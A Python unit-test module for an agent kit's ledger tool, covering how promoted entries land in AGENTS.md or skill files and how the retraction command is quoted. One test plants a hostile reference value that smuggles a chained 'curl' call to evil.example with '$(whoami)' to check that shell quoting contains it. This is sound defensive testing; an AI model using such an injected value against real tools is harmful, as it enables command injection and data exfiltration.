"""Tests for ledger.py — the LANDING SURFACE of a promotion (T-00000330).

UN MODULE FRÈRE : `test_ledger.py` passait la règle des 1600 lignes (S-00002684, S-00004034 ;
banc `.agents/evals/test_python_file_length.py`, R1). `LedgerLandingSurfaceTests` y est
DÉPLACÉE À L'IDENTIQUE, corps de classe inchangé (clôture du lot 95d6220a..c964c9a6, F1).

Même patron d'import que son aîné (import direct : pytest insère le dossier de ce fichier
dans `sys.path`). Les deux aides de l'aîné qu'emprunte la classe (`make_root`, `add`, et la
règle R-BANCS que porte `add`) sont importées PAR NOM, jamais recopiées ; aucune classe
`TestCase` de l'aîné n'est liée ici — elle serait collectée une seconde fois.
"""
import shlex
import subprocess
import sys
import unittest
from pathlib import Path

import ledger
from test_ledger import ROOT, add, make_root


class LedgerLandingSurfaceTests(unittest.TestCase):
    """T-00000330 — the landing surface is no longer AGENTS.md alone: it is the
    router body PLUS every traveling skill at depth 1 under .agents/skills/.

    STANDALONE, not a subclass of LedgerPromoteTests: subclassing would re-run
    that class's nine tests under this name, so the suite would report nineteen
    executions where this file adds TEN. A count that does not measure what its
    name says is the defect this repo keeps paying for; the four seam helpers are
    duplicated instead, which this codebase already assumes elsewhere."""

    def setUp(self):
        import tempfile

        self._tmpdir = tempfile.TemporaryDirectory()
        self.root = make_root(Path(self._tmpdir.name))

    def tearDown(self):
        self._tmpdir.cleanup()

    def _seam(self, token):
        orig = ledger._new_token
        ledger._new_token = lambda: token
        return orig

    def _write_doctrine(self, content: bytes) -> None:
        (self.root / "AGENTS.md").write_bytes(content)

    def _write_skill(self, name: str, content: bytes) -> Path:
        path = self.root / ".agents" / "skills" / name / "SKILL.md"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content)
        return path

    def _marker(self, lid: str, token: str) -> bytes:
        return ledger._promotion_marker(lid, token).encode("ascii")

    @staticmethod
    def _fold(text: str) -> str:
        return " ".join(text.split())

    def _promote(self, title, token, ref="§ X", category="constraint"):
        lid = add(self.root, category, title)
        orig = self._seam(token)
        try:
            out = ledger.promote_entry(self.root, lid, ref=ref)
        finally:
            ledger._new_token = orig
        return lid, out

    # --- the eight redirected restitutions ---------------------------------

    def test_eight_redirected_restitutions_are_verbatim(self):
        """The EIGHT surfaces of the redirection, word for word. The bound is in
        the name (L-00000190): this test cannot pass without exercising eight.
        THREE are MULTILINE — S1, S4, S6 — because their second and third source
        lines carry none of the redirected vocabulary and a line-by-line pin
        would not see them (L-00000237). No absence assertion on 'AGENTS.md':
        three of these labels now NAME it on purpose."""
        # S5 — first-promotion header (one line).
        lid, first = self._promote("s5", "aaaaaaaa", ref="§ target")
        self.assertIn(f"LEDGER: {lid} promoted; paste target: § target", first)
        # S2 — paste block header, no {ref} interpolation.
        self.assertIn(
            "Add this marker to the landing surface you pass to --ref (keep it byte-for-byte):",
            first,
        )
        # S4 — re-promotion header, MULTILINE (line 2 is not a hit).
        second = ledger.promote_entry(self.root, lid, ref="§ other")
        self.assertIn(
            self._fold("re-promoted: landing ref '§ target' -> '§ other' (token kept, block unchanged)"),
            self._fold(second),
        )
        # S1 — retraction warning, MULTILINE over three source lines. The ref is
        # shell-QUOTED on both halves (CWE-88 fix): '§ other' carries a SPACE, so
        # shlex.quote is not identity on it and the pin moved from the
        # hand-written double quotes to shlex's single ones. The words are
        # unchanged; only the delimiters moved.
        msg = ledger.set_status(self.root, lid, "archived")
        self.assertIn(
            self._fold(
                f"WARNING: {lid} was promoted; marker lives at '§ other'; archiving here does NOT "
                f'remove that line. Retract it by hand, then track the retraction: python '
                f".agents/bin/tasks.py new 'Rétracter le marqueur § other ({lid})' --chantier registres --pas-un-defaut \"rétractation d un marqueur promu\""
            ),
            self._fold(msg),
        )
        # S3 — the --ref refusal, which NAMES the file.
        with self.assertRaises(ledger.LedgerError) as ctx:
            ledger.promote_entry(self.root, lid, ref="  ")
        self.assertEqual(
            self._fold(str(ctx.exception)),
            "promote needs a landing reference: pass --ref <traveling skill under "
            ".agents/skills/, or the router body AGENTS.md>",
        )
        # S6 — the exclusion announcement, MULTILINE (line 2 is not a hit).
        other, _ = self._promote("s6", "bbbbbbbb")
        self._write_doctrine(self._marker(other, "bbbbbbbb"))
        notice = [l for l in ledger.context(self.root).splitlines() if l.startswith("- [promoted]")][0]
        self.assertIn(
            self._fold(
                "active entry/entries are carried by a landing surface and excluded here: "
                f"{other} — read them with `python .agents/bin/ledger.py list`."
            ),
            self._fold(notice),
        )
        # S7, S8 — the two CLI help labels, as constants (links 2 and 3 below).
        self.assertEqual(
            ledger.PROMOTE_HELP,
            "mark an entry as carried by a landing surface (a traveling skill, or the router body "
            "AGENTS.md for a first-order invariant) and print the paste-ready block (never writes "
            "any landing surface)",
        )
        self.assertEqual(
            ledger.PROMOTE_REF_HELP,
            "the target surface: a traveling skill under .agents/skills/, or the router body "
            "AGENTS.md for a first-order invariant only",
        )

    def test_ref_bearing_dquote_semicolon_dollar_paren_and_hash_cannot_escape_the_retraction_command(self):
        """CWE-88 (class 1, non-waivable) — the retraction line is restituted as
        a command the message TELLS the reader to run, and this kit's agents
        paste such lines. ``--ref`` is FREE TEXT, so a ref carrying the four
        shell metacharacters used to close the title and chain a command.

        THE BOUND IS IN THE NAME (L-00000190): this test cannot pass without
        exercising all four of ``"``, ``;``, ``$(...)`` and ``#``.

        The assertion is POSITIVE on the ESCAPED FORM, not an absence — an
        absence alone would go green if the line simply disappeared (L-00000232).
        The oracle is the SHELL LEXER, not a substring: the ref must survive as
        ONE argument and ``--chantier registres`` must still reach tasks.py.
        """
        hostile = '.agents/skills/x/SKILL.md" ; curl http://evil.example/$(whoami) #'
        for metachar in ('"', ";", "$(", "#"):
            self.assertIn(metachar, hostile, "the hostile ref stopped exercising a metacharacter")

        lid, _ = self._promote("cwe88", "cafebabe", ref=hostile)
        msg = ledger.set_status(self.root, lid, "archived")
        line = [l for l in msg.splitlines() if "tasks.py new" in l][0].strip()

        # POSITIVE pin on the escaped form: the WHOLE title is one shell word,
        # single-quoted, and the hand-written double quotes are gone.
        expected_title = shlex.quote(f"Rétracter le marqueur {hostile} ({lid})")
        self.assertEqual(
            line,
            f"python .agents/bin/tasks.py new {expected_title} --chantier registres --pas-un-defaut \"rétractation d un marqueur promu\"",
        )
        self.assertTrue(expected_title.startswith("'") and expected_title.endswith("'"))

        # The lexer is the oracle: 8 tokens, the ref sealed inside token 3, and
        # ';' never promoted to a separator of its own.
        tokens = shlex.split(line, comments=True)
        self.assertEqual(
            tokens,
            [
                "python",
                ".agents/bin/tasks.py",
                "new",
                f"Rétracter le marqueur {hostile} ({lid})",
                "--chantier",
                "registres", "--pas-un-defaut", "rétractation d un marqueur promu",
            ],
        )
        self.assertNotIn(";", tokens, "the ref escaped its string — a command was chained")
        self.assertNotIn("curl", tokens, "the injected command survived as an argv entry")

        # The DISPLAY half (the 'marker lives at ...' prose) is quoted too, so a
        # ref cannot forge a plausible extra line in the same restitution.
        self.assertIn(f"marker lives at {shlex.quote(hostile)};", self._fold(msg))

    def test_promote_help_labels_are_rendered_by_the_cli_entry_point(self):
        """THE THREE LINKS (L-00000154). Link 1: the constants carry the labels.
        Link 2: the parser renders them. LINK 3: main() CONSUMES build_parser().
        Only link 3 goes red if an extraction leaves main() building its own
        parser — links 1 and 2, and the four existing CLI sub-process
        invocations, all stay green through exactly that defect."""
        # link 1 — the constants.
        self.assertIn("never writes any landing surface", ledger.PROMOTE_HELP)
        self.assertIn("a traveling skill under .agents/skills/", ledger.PROMOTE_REF_HELP)

        # link 2 — rendered by the parser, through its PUBLIC api only.
        import contextlib
        import io

        def rendered(args):
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit):
                ledger.build_parser().parse_args(args)
            return self._fold(buf.getvalue())

        self.assertIn(self._fold(ledger.PROMOTE_HELP), rendered(["--help"]))
        self.assertIn(self._fold(ledger.PROMOTE_REF_HELP), rendered(["promote", "--help"]))

        # link 3 — THE WIRING: the real entry point, in a sub-process. COLUMNS is
        # pinned because argparse folds on the terminal width.
        import os as _os

        env = dict(_os.environ, COLUMNS="200")
        script = str(ROOT / ".agents" / "bin" / "ledger.py")
        top = subprocess.run(
            [sys.executable, script, "--help"], capture_output=True, text=True,
            encoding="utf-8", env=env,
        )
        self.assertEqual(top.returncode, 0, top.stderr)
        self.assertIn(self._fold(ledger.PROMOTE_HELP), self._fold(top.stdout))
        sub = subprocess.run(
            [sys.executable, script, "promote", "--help"], capture_output=True, text=True,
            encoding="utf-8", env=env,
        )
        self.assertEqual(sub.returncode, 0, sub.stderr)
        self.assertIn(self._fold(ledger.PROMOTE_REF_HELP), self._fold(sub.stdout))

    def test_the_injection_cost_note_is_emitted_on_first_promotion_and_on_re_promotion(self):
        """The NOTE rides the COMMON return, so both renders carry it — a
        re-promotion is exactly the gesture that changes the landing surface.
        Both renders asserted IN THE SAME TEST (L-00000145: a fix nothing pins
        is undone by the next refactor)."""
        note = (
            "NOTE: this entry LEAVES the SessionStart injection; it returns only through the TEXT "
            "you paste, and only if that surface is read every session (the router body is; a "
            "skill is read when invoked)."
        )
        lid, first = self._promote("noted", "cccccccc", ref="§ one")
        second = ledger.promote_entry(self.root, lid, ref="§ two")
        self.assertIn(note, self._fold(first))
        self.assertIn(note, self._fold(second))

    def test_promotion_notice_says_landing_surface_not_doctrine(self):
        lid, _ = self._promote("announced", "dddddddd")
        self._write_doctrine(self._marker(lid, "dddddddd"))
        notice = [l for l in ledger.context(self.root).splitlines() if l.startswith("- [promoted]")][0]
        self.assertIn("are carried by a landing surface and excluded", notice)  # witness
        self.assertNotIn("carried by the doctrine", notice)

    # --- the corpus, its pre-filter, and its two dangerous polarities -------

    def test_skill_landed_entry_is_excluded_but_announced_by_id(self):
        lid, _ = self._promote("lives in a skill", "eeeeeeee", ref=".agents/skills/seed/SKILL.md")
        self._write_skill("seed", b"# seed\n" + self._marker(lid, "eeeeeeee") + b"\n")
        out = ledger.context(self.root)
        self.assertNotIn("lives in a skill", out)
        self.assertIn("[promoted]", out)
        self.assertIn(lid, out)

    def test_sixth_skill_landed_entry_is_only_counted_in_plus_n_others(self):
        """SIX landed entries: five ids named, the SIXTH only counted. The bound
        is in the name (L-00000190) — this cannot pass without exercising six."""
        ids = []
        for i in range(6):
            lid, _ = self._promote(f"skilled {i}", f"{i:08x}", ref=".agents/skills/seed/SKILL.md")
            ids.append(lid)
        self._write_skill(
            "seed", b"\n".join(self._marker(l, f"{i:08x}") for i, l in enumerate(ids))
        )
        notice = [l for l in ledger.context(self.root).splitlines() if l.startswith("- [promoted]")][0]
        # POLARITY INVERTED BY T-00000351, deliberately. Entries are APPENDED, so
        # the newest is LAST; showing the FIRST five meant a freshly promoted entry
        # could NEVER be named. Measured on this repo before the change: 27 landed,
        # and the announcement listed the five OLDEST every session while the
        # promotion just made appeared only inside `+22 others` — precisely the one
        # whose landing someone is about to verify.
        #
        # Reversing the slice costs ZERO characters, which is why it was preferred
        # to raising the bound: naming all 27 would cost ~330 chars of a ~2500
        # budget measured at 2473, pushing LIVE entries out of the injection to
        # name promotions that are, by definition, already carried by a surface.
        self.assertIn("+1 older", notice)
        for lid in ids[1:]:
            self.assertIn(lid, notice, f"{lid} should be named: it is among the five newest")
        self.assertNotIn(ids[0], notice, "the OLDEST should be the one dropped, not the newest")
        # NON-VACUITY: the count stays the TOTAL, so a reader can tell more exist.
        self.assertIn("6 active", notice)

    def test_landing_corpus_keeps_only_surfaces_bearing_the_promotion_prefix(self):
        """The pre-filter's polarity, made OBSERVABLE: the assertion bears on the
        RETURN of _landing_corpus, not on a downstream effect. FOUR files are
        really written; exactly one carries the prefix, so the corpus has exactly
        one member and it is THAT path. NON-VACUITY WITNESS in the same test:
        _landing_paths returns 4 — without it a broken glob would return one
        corpus member for the wrong reason."""
        self._write_doctrine(b"# router body, no marker at all\n")
        self._write_skill("alpha", b"# alpha, nothing here\n")
        self._write_skill("beta", b"# beta " + self._marker("L-00000001", "12345678") + b"\n")
        self._write_skill("gamma", b"# gamma, nothing here either\n")
        paths = ledger._landing_paths(self.root)
        self.assertEqual(len(paths), 4, [str(p) for p in paths])   # witness
        self.assertEqual(paths, sorted(paths))                     # sorted, as declared
        corpus = ledger._landing_corpus(self.root)
        self.assertEqual([p.parent.name for p, _ in corpus], ["beta"])

    def test_prefilter_never_hides_a_landing_nor_invents_one(self):
        """The two DANGEROUS polarities. (1) A real landing buried in a large
        skill must still be found — a pre-filter that hid it would silently
        re-inject a promoted entry. (2) A surface without the prefix must never
        invent one."""
        lid, _ = self._promote("buried", "ffffffff", ref=".agents/skills/big/SKILL.md")
        self._write_skill(
            "big", b"padding\n" * 500 + self._marker(lid, "ffffffff") + b"\n" + b"more\n" * 500
        )
        self.assertNotIn("buried", ledger.context(self.root))      # (1) not hidden
        other, _ = self._promote("kept", "99999999")
        self._write_doctrine(b"prose citing " + other.encode() + b" and nothing else")
        self.assertIn("kept", ledger.context(self.root))           # (2) not invented

    def test_a_marker_in_the_retro_journal_never_excludes(self):
        """retro/LESSONS.md is the CANDIDATE journal, not a landing surface: a
        mark there means 'worth promoting', never 'promoted'. Counting it would
        exclude an entry from the injection on the strength of a note the author
        wrote to himself."""
        lid, _ = self._promote("still injected", "abcdefab")
        journal = self.root / "retro" / "LESSONS.md"
        journal.parent.mkdir(parents=True, exist_ok=True)
        journal.write_bytes(b"- lesson " + self._marker(lid, "abcdefab") + b"\n")
        self.assertIn("still injected", ledger.context(self.root))
        self.assertNotIn("[promoted]", ledger.context(self.root))
        # Witness: the SAME bytes in a real landing surface DO exclude, so the
        # non-exclusion above measures the path, not a broken matcher.
        self._write_skill("seed", journal.read_bytes())
        self.assertNotIn("still injected", ledger.context(self.root))

    def test_one_unreadable_skill_never_hides_the_router_landing(self):
        """The fail-open is PER SURFACE. One unreadable skill must not suppress a
        landing proven by another surface — a whole-corpus fail-open would
        silently re-inject every promoted entry the day one file goes bad.
        The unreadable file is simulated by doubling Path.read_bytes for that one
        path: chmod is a no-op for the owner on Windows, so a real permission
        bit would make this test measure nothing on half the dev boxes."""
        lid, _ = self._promote("landed in router", "0f0f0f0f")
        self._write_doctrine(self._marker(lid, "0f0f0f0f"))
        broken = self._write_skill("broken", b"promu-du-ledger placeholder\n")
        orig_read = Path.read_bytes

        def selective(self_path):
            if self_path == broken:
                raise OSError("unreadable surface")
            return orig_read(self_path)

        Path.read_bytes = selective
        try:
            corpus = ledger._landing_corpus(self.root)
            out = ledger.context(self.root)
        finally:
            Path.read_bytes = orig_read
        self.assertEqual([p.name for p, _ in corpus], ["AGENTS.md"])
        self.assertNotIn("landed in router", out)   # the router landing survives
        self.assertIn("[promoted]", out)


if __name__ == "__main__":
    unittest.main()
